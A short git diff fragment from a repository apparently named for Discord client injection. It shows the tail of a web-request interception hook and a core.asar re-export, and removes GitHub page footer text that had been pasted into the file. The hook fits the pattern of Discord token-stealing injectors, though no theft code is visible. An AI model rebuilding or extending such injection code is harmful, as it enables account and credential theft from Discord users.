@@ -984,22 +984,3 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
   }
 });
 module.exports = require('./core.asar');
-0 comments on commit 24a124e
-@ZekromDev
-Comment
- 
-Leave a comment
- 
- You’re receiving notifications because you’re watching this repository.
-Footer
-© 2024 GitHub, Inc.
-Footer navigation
-Terms
-Privacy
-Security
-Status
-Docs
-Contact
-Manage cookies
-Do not share my personal information
-update · ZekromDev/InjectionDiscord@24a124e 
